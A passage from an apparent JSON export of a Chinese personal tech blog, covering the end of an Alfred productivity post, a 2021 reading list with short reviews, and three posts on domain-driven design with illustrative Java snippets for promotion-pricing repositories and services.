附上一些常用自定义配置： 百度：https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;wd={query} 简书：http://www.jianshu.com/search?utf8=%E2%9C%93&amp;q={query} 淘宝：http://s.taobao.com/search?oe=utf-8&amp;f=8&amp;q={query} 京东：https://search.jd.com/Search?keyword={query}&amp;enc=utf-8&amp;wq={query} 微信文章：http://weixin.sogou.com/weixin?type=2&amp;query={query} stackoverflow：http://www.stackoverflow.com/search?q={query} github：https://github.com/search?utf8=%E2%9C%93&amp;q={query} maven：http://mvnrepository.com/search?q={query} Android API Search：https://developer.android.com/reference/classes.html#q={query} 快速打开控制台并执行命令这个功能用的不多，但也要提一下，默认会打开系统自带终端并执行，我这里的配置是结合 iTerm 启动执行。 Workflow 功能Workflow 才是这款软件的灵魂所在，可以通过开发插件的形式扩展软件功能。 我举三个最常用的扩展吧。 谷歌身份验证器谷歌身份验证器是在做某些危险操作时进行二次确认的一个机制，在第一次初始化时根据账户绑定一个 key，然后每次使用都需要根据当前时间算出一个数字输入，来增强安全性保障，这个原理跟游戏的令牌是一样的。有了这个插件我就可以只输入一个 ok 关键字就可以获得验证口令，回车粘贴，只需要 2 秒。 与此同时，而别人的操作流程是 掏出手机解锁。 找到 Authy App 打开。 看到数字口令，手动输入。 输入超时，口令换新，重新输入。 以上四步的操作时间平均在 20 秒以上，除非手机时刻在 Authy 界面。 知一的开发者工具箱这个是博主自己开发的一个扩展，目前已在 Github 开源，https://github.com/noogel/Alfred-Workflow，欢迎 Star、Fork、提 Feature ~ 具体的使用教程欢迎查看 https://github.com/noogel/Alfred-Workflow 初衷就是提高平时的开发效率，将一些常用的重复性操作给命令化，以此来节省时间。比如我最常用的 ntm 命令，可以获取当前时间戳或者标准时间，也可以将标准时间和时间戳互转。整个操作 2 秒完成。 而别人的操作则分为以下几步。 打开浏览器搜索时间戳转换工具。 打开工具网页，等待加载完成。 输入时间戳或标准时间，点击转换。 工具箱中的内容不仅这个，还有很多实用的工具，可以大大的提高效率。 有道翻译 最后一个常用的插件是有道翻译扩展，输入关键字 yd 就能自动转换中英文。 最后平时工作的使用频率还是蛮高的，节省下来的时间可以做更多的事情。 Alfred 的功能不止于此，在其官网有更详尽的描述，感兴趣的可以试用一下，有什么问题也可以咨询我。我是知一，如果这篇文章对你有益，欢迎一键三连~","categories":[],"tags":[{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"}]},{"title":"知一的 2021 已读书单","slug":"关于未来/知一的 2021 已读书单","date":"2022-01-21T00:00:00.000Z","updated":"2025-07-23T07:30:58.919Z","comments":true,"path":"2022/01/21/1.html","link":"","permalink":"https://noogel.xyz/2022/01/21/1.html","excerpt":"2021年已经过去，准备对去年看过的书进行一个复盘，回忆下从中得到了什么成长。","text":"2021年已经过去，准备对去年看过的书进行一个复盘，回忆下从中得到了什么成长。 文化随笔 首先是同事推荐的一本书 ——《书读完了》，由金克木先生所著，豆瓣评分 8.6 ，还是蛮高的。如今书籍浩如烟海，怎么可能读完？其实先生之所谓读完，我主要记住了以下两个观点。一是说书也有层级，有些书是最基础的书，如《诗经》、《春秋》这些表达中国最底层文化思想的书籍，而其他书则是基于这些书发展而来的，所以要读就读经典。读懂经典，那么后继的书不读也自然懂了大半。中国古书不过是那几十种，是读得完的。二是说经典虽难读懂，但也不要贪图潮流而追逐当下。古人说『读书得间』，读出字里行间的微言大义，于无字处看出字来。看字读句，要看出问题，若能『望气』而知书的『格局』，会看书的『相』，那就可以有『略览群书』的本领，不必一字一句的读，而做到『博览群书』。很可惜在碎片化的时间里很难有如此深度的思考。 第二本说一下《金字塔原理》，这本书主要讲逻辑思维与表达呈现。首先作者讲的是金字塔的基本结构：中心思想明确，结论先行，以上统下，归类分组，逻辑递进。先重要后次要，先全局后细节，先结论后原因，先结果后过程。然后围绕金字塔原理通过一个个案例来讲具体的做法：自上而下表达，自下而上思考，纵向疑问回答／总结概括，横向归类分组／演绎归纳，序言讲故事，标题提炼思想精华。读这本书是因为校友群有人在看，刚好能解决我写博客困难的问题，于是就找来看了看，没有读完，不过写文章的思路总归是有了。 第三本便是《空谷幽兰》，作者比尔·波特是著名的汉学家，在台湾当过两年沙弥，对中国传统文化有着很大的兴趣。这本书主要是讲他在八零年代实地寻访中国隐士的过程，讲述了中国传统隐士在终南山一带的隐居生活，探寻他们为何要离开城市或人群，到幽静之处筑居，有的人五十年不下山，有的人活了近百岁。又讲述了中国传统道与佛的异同。书中描述的意境我只能摘录摘录几句给大家看看： 有个叫宝胜的和尚讲：“真修行的人太少了。至于我自己，我不怎么修行。我晚上打坐，白天干杂活儿。我只是在照管这座庙。”这是得道之人所说的话。陈世杰道长这样谈修道：“当人们努力去寻找道的时候，他们就失去了道。他们混淆了有和无，我们所能做的一切只是修德（美德，精神力量），德包括我们的精神、我们的心、我们的想法。真正的德导致真正的道。但是大多数人修的不是真正的德。他们修炼的是神通和心念，于是我们以为他们得道了。但是他们错了。修习真正的德不是要去掉所有的神通和念头，像一个婴儿一样，无看而看，无听而听，无知而知。首先你要修德，道自然就来了。”这是我听过最好也最透彻的对修道的说法。 伟人传记 《毛泽东传》这部伟人传记还没读完，不过非常值得推荐，可以结合《毛泽东选集》一起读，会有很多收获。 技术加成然后要说的是关于技术类的，整个一年读的都是关于架构和领域驱动设计的书，都很不错。 《架构整洁之道》主要讲了整洁架构的设计目标，系统地剖析其缘起、内涵及应用场景，涵盖软件研发的完整过程及所有核心架构模式。绝对是架构书类中的必读经典。 《软件架构设计》围绕软件架构设计，系统化地梳理技术架构与业务架构的方法论与实践。这本书不仅讲了业务层面的内容，也讲清了很多技术深度上的知识和一些底层的技术思想。 《实现领域驱动设计》这本书出了很多年了，算是领域驱动设计里的经典，但是奈何翻译太差劲，不建议作为入门书来读。系统性读书的话建议先看看国人写的，再结合思特沃克公司写的文章理解。 《复杂软件设计之道》这本国人写的书，前半部分写的还可以，解决了我一些疑问，后半部分就读不进去了。 关于领域驱动设计总结了一篇文章《万字长文谈谈领域驱动设计》 《垃圾回收的算法与实现》这本书写 GC 还是不错，重点在于算法和不同语言的实现，我也是读了个大概。 旅游攻略 然后说两本旅游攻略的书，《西藏不止旅行》、《慢拍西藏》，因为 2021 年十一计划去西藏玩，所以提前看了两本书给自己种种草。写了一篇关于西藏的文章《云之彼端·生活的另一种打开方式》 科普和健身接下来就是四本关于科普和健身的书了。 《复杂》一书作者梅拉妮·米歇尔是计算机科学教授，她在书中讲述了复杂与复杂系统的关系，给复杂系统一个基本的定义。讲述了各个领域的复杂系统以及度量系统复杂度的方法。读书收获则是加深了对于复杂系统的认知，结合领域驱动设计了解了拆解系统、管理系统复杂度的方法。豆瓣评分 9.0 ，非常值得一读。 《现实不似你所见》深入浅出地讲述了物理学的前世今生，虽然作者已经讲得比较简单了，很少用公式来表达，但我只看懂了只言片语。没想到的是在经典力学之后，又经过了相对论和量子力学，直至现在的量子引力，科学家们竟然进行了这么多的探索。在量子引力的世界，时间、空间、场、粒子都不存在，它们被极度简化为协变量子场的表现形式，感兴趣的读者可以看一看。 《运动改造大脑》这本书最初来源于樊登听书对我产生的影响，作者主要讲了适度复杂运动对于大脑的正向影响。 透过美国高中的体育改革计划、真实的案例与亲身经历、上百项科学研究证实，运动不只能健身、锻炼肌肉，还能锻炼大脑，改造心智与智商，让你更聪明、更快乐、更幸福！运动能刺激脑干，提供能量、热情和动机，还能调节脑内神经递质，改变既定的自我概念，稳定情绪，增进学习力。 《这里是中国 2》这本书讲述了中国在建筑和经济方面的一些成就，不如前两年看的同系列的第一本书有意思。两本都值得看看。 小说类 小说类基本是听，刘慈欣在《三体》之后变得几乎家喻户晓，他写的其他作品同样很好，比如我听的《球状闪电》，当我在听了《神们自己》之后，发现阿西莫夫是西方的刘慈欣，不过他是比刘慈欣要早的，两者的风格很像，鸿篇巨著，构建一个史诗级世界。读完刘慈欣建议看看阿西莫夫合集。 再有一篇是网络小说《13 路末班车》，这篇网文不同于其他的，特点是足够恐怖但又不吓人，主角不是脑残有一定智商，剧情连贯不拖拉。当然也有缺点是有些环节逻辑不缜密，人物动机牵强。 附录最后附上书名-作者-豆瓣评分-京东分类 《书读完了》 - 金克木 - 8.6 - 文化随笔《金字塔原理》 - 芭芭拉·明托 - 8.1 - 管理经典《空谷幽兰》 - 比尔波特 - 8.3 - 文化随笔《架构整洁之道》 - 罗伯特 C·马丁 - 8.7 - 软件工程及软件方法学《软件架构设计》 - 余春龙 - 8.7 - 软件工程及软件方法学《实现领域驱动设计》 - 沃恩·弗农 - 8.4 - 软件工程及软件方法学《复杂软件设计之道》 - 邱晨阳 - 7.6 - 软件工程及软件方法学《垃圾回收的算法与实现》 - 中村成洋 相川光 - 8.2 - 编程语言与程序设计《西藏不止旅行》 - 周硚 - 7.2 - 旅游攻略《慢拍西藏》 - 赵利山 - 7.5 - 旅游攻略《毛泽东传》 - 中共中央文献研究室 - x - 传记《复杂》 - 梅拉妮·米歇尔 - 9.0 - 科普读物《这里是中国 2》 - 星球研究所 - 8.3 - 科普读物《现实不似你所见》 - 卡洛·罗韦利 - 9.2 科普读物《运动改造大脑》 - 约翰·瑞迪 - 7.5 - 运动健身《球状闪电》 - 刘慈欣 - 9.0 - 科幻小说《神们自己》 - 阿西莫夫 - 8.4 - 科幻小说《13 路末班车》 - 老八零 2 - 网络小说","categories":[],"tags":[{"name":"书单","slug":"书单","permalink":"https://noogel.xyz/tags/%E4%B9%A6%E5%8D%95/"}]},{"title":"领域驱动设计精粹（下）","slug":"关于技术/领域驱动设计/领域驱动设计精粹（下）","date":"2021-12-07T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2021/12/07/1.html","link":"","permalink":"https://noogel.xyz/2021/12/07/1.html","excerpt":"谈谈领域驱动设计的落地前文提到了事件风暴产出的领域模型是概念模型，到实际落地还有些距离，而落地的结果也是各不相同，我觉得说落地，要先回顾一下领域驱动设计的两个作用。 通过战略设计拆分子域，指导微服务拆分。 通过事件风暴建立领域概念模型，指导代码设计。 也就是说领域驱动设计产出的结果是指导性的，并不是一个直接可落地的结果。落地的方案则是要通过架构设计和框架选择上来进行。架构是为了控制软件复杂性而做，就好像『一千个读者心中有一千个哈姆雷特』，不同人做架构不尽相同。下面说说我的落地方式。","text":"谈谈领域驱动设计的落地前文提到了事件风暴产出的领域模型是概念模型，到实际落地还有些距离，而落地的结果也是各不相同，我觉得说落地，要先回顾一下领域驱动设计的两个作用。 通过战略设计拆分子域，指导微服务拆分。 通过事件风暴建立领域概念模型，指导代码设计。 也就是说领域驱动设计产出的结果是指导性的，并不是一个直接可落地的结果。落地的方案则是要通过架构设计和框架选择上来进行。架构是为了控制软件复杂性而做，就好像『一千个读者心中有一千个哈姆雷特』，不同人做架构不尽相同。下面说说我的落地方式。 架构演进我们最初接触和使用的分层架构是三层的，三层架构解决了程序内部代码调用复杂和职责不清的问题，在 DDD 分层架构中的关于对象和服务被重新归类到不同分层中，确定了层与层之间的职责边界。DDD 提出了四层架构，其中最主要的变化是提出领域层的概念，需要领域专家对于业务知识的精准把握之上，根据领域设计方法建立领域模型，把变动较少的领域模型放入领域层，而多变的业务场景代码放入应用层。如下图对应三层到四层的演进过程。 分层架构的一个重要原则是每层只能与位于其下方的层发生耦合，可以简单分为以下两种： 严格分层架构，某层只能与位于其直接下方的层发生耦合。 松散分层架构，允许某层与它的任意下方层发生耦合。 这两种分层架构的耦合方式是各有利弊，在网络上对于他们也是各有各的见解。结合实际情况在开发中，更倾向于采用松散分层架构，但是要禁止用户接口层直接访问基础设施层，防止一些潜在的安全问题。 子域划分基于现有三层架构，在其中增加 domain 包的形式增加领域服务层。不同的子域通过包来划分如下： 123package noogel.xyz.domain.deal; // 交易子域package noogel.xyz.domain.quote; // 算价子域package noogel.xyz.domain.promotion; // 促销子域 同一个领域服务下面再按照领域对象、领域服务、领域资源库、防腐层等方式组织。 1234package noogel.xyz.domain.xxx.repository; // 资源库接口定义package noogel.xyz.domain.xxx.entity; // 领域对象package noogel.xyz.domain.xxx.facade; // 防腐层package noogel.xyz.domain.xxx.service; // 领域服务 领域对象领域驱动解决的一个问题就是对象的贫血问题。通过如下促销领域对象来说明，对于当前购买商品组合能否满足购买规则的检查逻辑不是放在服务层或者工具类中，而是由领域对象提供方法支持。 12345678910111213141516171819202122232425262728@Getter@ToString@...public class PromotionDo &#123; /** * 业务幂等 */ private String bizNo; // 省略字段... private Long beginTime; private Long endTime; private String desc; /** * 计算生效数据 * @param items * @return */ public List&lt;PromotionDo&gt; calculateValid(List&lt;ItemDo&gt; items) &#123; switch (rule.getKind()) &#123; // ... &#125; List&lt;PromotionDo&gt; promoDataList = new ArrayList&lt;&gt;(); // do sth ... return promoDataList; &#125;&#125; 资源库（依赖倒置）资源库对外的整体访问由 Repository 提供，它聚合了各个资源库的数据信息，同时也承担了资源存储的逻辑。我们将资源库的接口定义放在领域层，而具体实现放在基础设施层。 1234package noogel.xyz.domain.xxx.repository; // 资源库接口定义package noogel.xyz.infrastructure.repository; // 资源库实现package noogel.xyz.infrastructure.rpc; // RPC 服务package noogel.xyz.infrastructure.dao; // 数据库访问对象 资源库接口定义，提供必要的入参，并且以领域对象的形式作为结果返回。至于组织返回的领域对象，交由具体实现类来实现，可以通过调用数据库、缓存系统、RPC 接口等形式来组织生成领域对象。 1234567891011121314151617181920212223public interface PromotionRepository &#123; /** * 保存 xx * @param data 领域对象 * @return 唯一 key */ String create(PromotionDo data); /** * 批量更新状态 * @param key * @param state * @return */ boolean batchUpdateState(List&lt;String&gt; key, PromoState state); /** * 批量查询 * @param promoIds * @return */ Map&lt;String, PromotionDo&gt; batchGetOnlineById(List&lt;Long&gt; ids);&#125; 防腐层用来消除外部上下文结构差异的作用，也叫适配层。比如在算价上下文中需要调用促销上下文数据，不同的促销数据源提供了不同的接口和数据，这时就需要引入防腐层来屏蔽差异，防止外部上下文侵入领域内部影响代码模型。首先定义需要的数据接口规范。 12345678910public interface PromotionFacade &#123; /** * 计算促销数据 * * @param ctx * @return */ List&lt;PromotionData&gt; calculatePromotion(PromotionContext ctx);&#125; 实现类来用处理外部数据的差异，按照接口要求封装数据，简化模型的复杂性。 1234567891011121314151617181920212223public class Promotion1Facade implements PromotionFacade &#123; @Override public List&lt;PromotionData&gt; calculatePromotion(PromotionContext ctx) &#123; PromotionData promoData = PromotionData.of(...); return Collections.singletonList(promoData); &#125;&#125;public class Promotion2Facade implements PromotionFacade &#123; @Autowired private RpcService rpcService; @Override public List&lt;PromotionData&gt; calculatePromotion(PromotionContext ctx) &#123; PromotionData data = new PromotionData(); // do sth ... return data; &#125;&#125; 上下文集成对于上下文集成的手段可以通过 RPC 服务、HTTP 服务、MQ 消息订阅。 领域服务上面我们讲述了各个要素对于资源和行为的封装，业务逻辑的实现代码应该尽量放在聚合根边界内。但是总会遇到不适合放在聚合根上的业务逻辑，而此时领域服务就需要承载编排组合领域对象、资源库和防腐接口等一系列要素，提供对其它上下文的交互接口。 12345678910111213141516171819202122232425public interface PromotionService &#123; /** * 创建促销 * * @param item * @return */ String createPromotion(CreatePromotionDto item); /** * 批量更新状态 * * @param req * @return */ boolean batchUpdatePromotion(BatchUpdatePromotionReqDto req); /** * 计算有效的促销 * * @param req * @return */ List&lt;PromoResultDto&gt; calculateValidPromotion(CalculateValidPromotionReqDto req);&#125; 落地延伸DDD 的设计概念很多，学习成本比较高，于是我们组织了《实现领域驱动设计》的读书分享会，通过共读分享交流理解的方式，让大家对于 DDD 的设计方法和概念有了比较统一的认知。同时发现在做设计分享时，组内的认知比较一致，而对外的理解成本则会比较高。 不论我们怎样称呼应用层和领域层，但是四层架构的优势已经显而易见，对于电商交易这样一类相对复杂的系统而言。DDD 教会我们怎么拆分领域，如何沉淀领域模型，而如何组织领域服务提供业务功能上是匮乏的，下面是基于系统问题和业界资料总结的一个抽象框架，描述的是如何组合核心能力与业务场景，并提供一个配置化的灵活系统。 能力单元 提供基础能力的独立单元，只单纯依赖下游数据提供能力，职责比较单一，对应领域驱动设计的领域服务。 场景单元 通过编排不同能力单元，形成一个预定义的执行流程，叫做场景单元。场景单元有以下关键要素： 执行节点：执行节点负责转换出入参并调用能力单元或场景单元，返回结果给下一个节点。 条件控制：根据执行节点结果进行简单逻辑判断选择不同的执行路径。 干预策略：干预策略是场景的扩展点，通过预留的扩展点可以干预执行流程。 所以一个场景单元的实际处理通路由条件控制和干预策略决定。 策略配置服务 提供静态或动态的策略配置给场景单元使用。 基于节点维度的简单风控策略支持，比如限流、熔断等。 框架图 核心能力封装数据和行为，职责要单一且通用，对外提供完善的接口供场景调用，核心能力内部是高内聚的，能力外不能与其它能力模块发生直接耦合，只能通过场景进行间接耦合，要保证核心能力的职责单一性。 能力模型是指对于复杂场景进行归类和抽象得出的一个模型，可以用来解决某一类通用问题。能力模型既可以是由订单系统内部提供的，也可能是由外部系统通过 RPC 形式提供的一整套能力接口包装而得。 内部事件，由于能力之间不允许直接耦合，所以内部事件不允许在能力模块内部发送，只能由场景中进行控制发送，并且能力内部不允许直接监听，而应该把监听事件作为场景的一种入口，实现场景之间的依赖调用。 场景单元偏流程数据编排，需要组织和协调资源的代码被定义为流程。场景单元与策略服务耦合更重，通过策略服务控制场景流程图的走向，以此来实现系统配置化。 参考《复杂软件设计之道：领域驱动设计全面解析与实战》 - 彭晨阳《实现领域驱动设计》 - 沃恩·弗农《解构领域驱动设计》 - 张逸《DDD实战课》 - 极客时间 文章https://insights.thoughtworks.cn/backend-development-ddd/https://zhuanlan.zhihu.com/p/383427771https://cloud.tencent.com/developer/article/1549817","categories":[{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/categories/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"},{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/tags/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"}]},{"title":"领域驱动设计精粹（中）","slug":"关于技术/领域驱动设计/领域驱动设计精粹（中）","date":"2021-12-05T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2021/12/05/1.html","link":"","permalink":"https://noogel.xyz/2021/12/05/1.html","excerpt":"领域驱动设计核心概念领域驱动设计学习拦路虎之一就是众多的概念，第一次接触这些概念会有一定的理解成本，不过正是这些概念支撑起的领域驱动设计，接下来会以电商为例对其中的核心概念做介绍。","text":"领域驱动设计核心概念领域驱动设计学习拦路虎之一就是众多的概念，第一次接触这些概念会有一定的理解成本，不过正是这些概念支撑起的领域驱动设计，接下来会以电商为例对其中的核心概念做介绍。 电商案例 网上购物已经成为我们生活中不可分割的一部分，作为一个用户而言我们经历的流程有以下几点： 从商品列表页面选择需要的商品。 查查商品的促销活动，凑凑满减。 在购物车选择需要买的商品下单。 下完单通过微信或者支付宝付钱。 然后等着物流送货上门。 作为电商的管理人员我们需要做的则是以下几点： 从采购点采购商品，存放到仓库。 编辑商品信息，上架售卖。 编辑一些优惠信息展示在平台上。 将用户下单的商品通知仓库发货。 营收成本的清结算。 电商平台作为一个复杂系统主要有多阶段、⻓链路、多角⾊参与、多信息互通的商品&#x2F;服务交换过程的特点。而领域驱动设计中的概念能支撑我们将电商复杂流程拆解消化，并且建立一个易扩展、更稳定的系统。 通用语言和限界上下文既然有多方协作参与系统的建设和运营，就需要沟通，而降低沟通成本的一个关键就是统一概念和认知，比如我们对于商品的认知，同样都是 iPhone 13，蓝色和粉色，128G 和 256G ，我们说卖掉了一个 iPhone 13 还是卖掉了一个 iPhone 13 蓝色 256G 要怎么表达，这时我们需要有两个概念 SKU 和 SPU 来区分，SKU 作为商品最小售卖单元表达后者，SPU 作为商品信息聚合的最小单位表达前者。 正是因为不同参与角色可能有不同的理解，为了降低大家沟通的障碍，提出了通用语言和限界上下文这两个重要概念。 使团队交流达成共识的能够明确简单清晰地描述业务规则和业务含义的语言就是通用语言。 解决各岗位的沟通障碍问题，促进不同岗位的和合作，确保业务需求的正确表达。通用语言贯穿于整个设计过程，基于通用语言可以开发出可读性更好的代码，能准确的把业务需求转化为代码。 界限上下文则是用来封装通用语言和领域对象，提供上下文环境，保证在上下文内的业务概念和流程等有一个确切的含义，没有二义性。 业务概念往往由领域专家带领团队统一通用语言，明确上下文边界，以结算单这个概念在订单上下文和结算上下文的差异来举例： 订单上下文：记录一笔订单所购买商品的消费明细，包括商品原始金额、各项优惠金额、实付货币金额及种类。 结算上下文：记录的是商家、平台、供货方在一段时间之内的应收应付款项。 明确上下文边界后，我们跟不同岗位的人沟通即使使用相同词汇也能准确理解其含义。 领域专家和领域知识 领域驱动设计强调由领域专家带领大家进行领域建模。领域专家指的是对一个领域的概念和业务流程精通的人，能快速识别或预判业务风险并能给出有效解决方案的人。 他可以是各个岗位的人，包括一个开发也能成为领域专家。领域知识则是这个领域的各种概念和业务流程。 战略设计与战术设计领域驱动设计作为一种设计方法论，从两个方向指导设计思想，提出了战略设计和战术设计的概念。 战略设计是从业务视角出发，建立业务领域模型，划分领域边界，建立通用语言下的限界上下文。它是从顶层视角来审视我们的软件系统各个子模块之间的边界。 拿上面的流程举例来说明，一个有经验的领域专家会带领大家通过事件风暴建模的方法进行子域拆分，大致分为交易域、营销域、支付域、商品域、履约域。 战术设计则是从技术视角出发，侧重于领域模型的技术实现，完成软件开发和落地，它主要关注的是技术层面的实施。战术设计识别出来的是聚合根、实体、值对象、领域服务、应用服务和资源库等代码逻辑的设计和实现。 什么是领域模型我们都不喜欢写 CRUD 的代码，只因为这些代码往往逻辑很简单，也不具备足够的扩展性，单一场景下可以很快开发出来，如果再加一个场景就又要开发一套，如果场景复杂并且不断变化，开发效率不仅会变慢，而且会更难以维护。下面通过支付系统来举例。 对于 CRUD 的实践来说，在对接支付渠道的时候，给每一家渠道都增加渠道单记录表，字段参照渠道参数定义的，对接微信时增加 wechat_trade 表，增加支付宝时增加 alipay_trade 表。问题就是当渠道增多时每次都建表显然不现实。 正常的做法则是，统一支付单记录，提取支付关键信息，通过总表和渠道表来记录，总表记录关键信息，把次要信息放入渠道表。相当于把支付单信息做了一次垂直拆分。 随着发展，新增了连续订阅业务，产品说需要在支付单中识别出是系统扣费还是用户主动付费的，这时你会想着扩列来支持，可是业务千变万化，不能每次都这样做。 其实软件开发中的许多问题，例如沟通问题、演化问题都和领域模型有关。领域模型是对领域内的概念类或现实世界中对象的可视化表示。它专注于分析问题领域本身，发掘重要的业务领域概念，并建立业务领域概念之间的关系。 实体和值对象实体和值对象是组成领域模型的基础单元。 实体拥有唯一标识符，且标识符在历经各种状态变更后仍能保持一致。 对实体而言，重要的不是其属性，而是其延续性和标识，对象的延续性和标识会跨越甚至超出软件的生命周期。我们把这样的对象称为实体。从上面的实例来说，支付单有唯一的 ID，渠道单有自己的唯一 ID，它们都是实体。 当一个对象用来描述一个实物，而没有唯一的标识符，叫做值对象。 值对象本质就是一个集合，可以保证属性归类的清晰和概念的完整性。由于金额不能单独表达用户的消费额，需要由支付金额和货币类型组合才能表达，消费额是一组值对象。 聚合与聚合根聚合是领域模型的具体表达。 聚合是业务和逻辑紧密关联的实体和值对象组合而成，聚合是数据修改和持久化的基本单元，一个聚合对应一个数据的持久化。 聚合在 DDD 分层架构中属于领域层，一个聚合提供一个业务核心能力，领域层包含了多个聚合，聚合内的实体以充血模型实现个体业务能力，以及业务逻辑的高内聚。 聚合根也叫做根实体，它不仅仅是实体，还是实体的管理者。 聚合之间通过聚合根关联引用，如果需要访问其他聚合的实体，先访问聚合根，再导航到聚合内部的实体。即外部对象不能直接访问聚合内的实体。 拿上面支付的例子来说，支付是一个聚合，支付单是聚合根，渠道单是依附于聚合根的另一个实体，渠道单的所有行为都要通过支付单进行操作。 上面说到聚合之间通过聚合根关联引用，一个实体是否属于聚合根取决于所处的聚合。在退款聚合中，退款单是聚合根，绑定的支付单，在这里支付单是普通实体。所以是否是聚合根取决于具体场景。 聚合的特点：高内聚、低耦合，它是领域模型中最底层的边界，可以作为拆分微服务的最小单位。 概念关系关于领域驱动设计的核心概念已经介绍了一部分，后面还有一部分。关于这些概念的涵盖范围见下图。 从事件风暴建模学到什么在这里我说一下电商中比较核心的一个流程。在京东购物我们会选择很多需要的商品添加到购物车，在双十一的时候会凑单满减，然后从购物车选中下单。现在我们要设计的部分是用户在选择多件商品时自动给用户使用上最优的多种促销活动，在用户下单的时候能够计算好用户应该付多少钱，每件商品分别应付和优惠多少钱。后面的表达我会用算价来代表这个流程。 领域知识的构成在领域驱动设计中很强调领域专家这角色，与团队人员共同协作完成任务。而往往团队人员就拥有领域专家所拥有的部分知识，从而承担领域专家的职责，那么剩下的领域知识就需要靠团队人员借助外援来填补，方式包括但不限于以下三种方式： 通过网络渠道（论文、文章、书籍）获得。 请教身边有相关经验的朋友。 通过竞品分析获得。 当我们团队获得该领域下主要的领域知识后，需要结合实际需求进行战略设计和战术设计，就可以通过事件风暴建模方法进行领域建模。 本来是想着拿实际的例子来讲一遍事件风暴建模的过程，现在想想与其照本宣科的讲知识，不如写写经验和感悟来的实在。 事件风暴 VS 传统开发事件风暴建模的标准流程可以很轻松地找到，这里不再赘述。主要说下从传统软件开发模型到领域驱动设计的领域建模，发生了什么变化。 传统模式：产品需求-&gt;需求分析-&gt;详细设计-&gt;ER模型-&gt;UML 设计DDD 模式：事件风暴-&gt;产品愿景-&gt;场景分析-&gt;领域建模-&gt;微服务拆分与设计。 在传统模式下的产出的是可直接落地的设计结果，但是缺乏顶层设计，对于后期的变更维护难以高效支撑。而 DDD 的关注点更多的是顶层设计和概念模型，概念模型并不是可直接落地的结果，这样的优势便是在后期的扩展和变更中更容易。 子域拆分的关键经验关于如何拆分子域，看了很多的内容后得到的一句话：『凭经验』，这个就让人很糊涂，我如何知道我拆分的是否准确。 当我带着问题去找书查资料，收获还是比较快的，有一段话驱散了一部分迷雾：『领域的边界划分不断演绎，只要发现复杂性凝聚的地方，就划定为有界上下文，割裂它与其他系统的关系，并派出精兵强将专门对付。』它给了我两个点醒： 领域的边界是不断演绎的。 领域内部是高内聚的，领域间是低耦合的。 从这两点出发，可以通过以下两点执行： 和领域专家沟通现在，并预判一下未来。 分析领域内头部公司的策略。 领域建模的关键经验假定产品愿景是可行并且可执行的。在场景分析和领域建模的过程，有个通用的范式。 提取业务中的动词和名词识别为领域概念。 通过业务中的定语对领域概念进行归纳抽象。 对确定的领域概念进行关系确认。 由此我们可以得出领域分析模型，这是一个比较抽象的模型，此时还无法落地。从复杂性角度来看领域建模控制的是业务复杂性。 复杂性问题控制方式在之前的文章中也提到过三点： 抽象 分治 领域知识 现在反过来看，提炼领域概念是抽象，子域拆分是分治，而要做到这两点的正需要的是领域知识。领域驱动设计不仅告诉了我们『道』，也告诉了我们『术』。","categories":[{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/categories/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"}],"tags":[{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"},{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/tags/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"}]},{"title":"领域驱动设计精粹（上）","slug":"关于技术/领域驱动设计/领域驱动设计精粹（上）","date":"2021-12-03T00:00:00.000Z","updated":"2025-07-23T07:30:58.918Z","comments":true,"path":"2021/12/03/1.html","link":"","permalink":"https://noogel.xyz/2021/12/03/1.html","excerpt":"概述概念可以简单描述某类事物，这类事物可以是实体也可以是问题。领域驱动设计是为了管理系统复杂性问题而生的一套方法论。 随着业务系统的复杂性不断提高，系统的性能和灵活性要求也会越来越高，如何构建一个扩展性强、可用性高的业务系统是需要我们不断思考的问题。 我们以交易系统为例，在互联网之初，实体商业占据绝对主导地位的时代，电子商务系统最初的目的就是把货物卖出去，业务需求很简单，就是一手付钱，一手交货，而更多的难点是在于如何让人们接受并认可在网络上进行交易。随着这几十年的发展，电商早已不是最初的样子，需求变为如何更快更多的把商品卖出去，于是产生出了层出不穷你算不清楚的促销活动，比如满减、凑单、会员价、拼团、优惠券等。你买东西的价格也许只有系统能真正算清楚。 系统的复杂性比起最初，呈几何倍的增长，如何控制并管理系统复杂度是我们需要在业务发展过程中需要解决的问题。复杂的业务各有各的复杂，而拆解之道也各有各的侧重，今天要介绍的是领域驱动设计如何帮助我们拆解需求，并建立一个灵活性高、可扩展的业务系统。","text":"概述概念可以简单描述某类事物，这类事物可以是实体也可以是问题。领域驱动设计是为了管理系统复杂性问题而生的一套方法论。 随着业务系统的复杂性不断提高，系统的性能和灵活性要求也会越来越高，如何构建一个扩展性强、可用性高的业务系统是需要我们不断思考的问题。 我们以交易系统为例，在互联网之初，实体商业占据绝对主导地位的时代，电子商务系统最初的目的就是把货物卖出去，业务需求很简单，就是一手付钱，一手交货，而更多的难点是在于如何让人们接受并认可在网络上进行交易。随着这几十年的发展，电商早已不是最初的样子，需求变为如何更快更多的把商品卖出去，于是产生出了层出不穷你算不清楚的促销活动，比如满减、凑单、会员价、拼团、优惠券等。你买东西的价格也许只有系统能真正算清楚。 系统的复杂性比起最初，呈几何倍的增长，如何控制并管理系统复杂度是我们需要在业务发展过程中需要解决的问题。复杂的业务各有各的复杂，而拆解之道也各有各的侧重，今天要介绍的是领域驱动设计如何帮助我们拆解需求，并建立一个灵活性高、可扩展的业务系统。 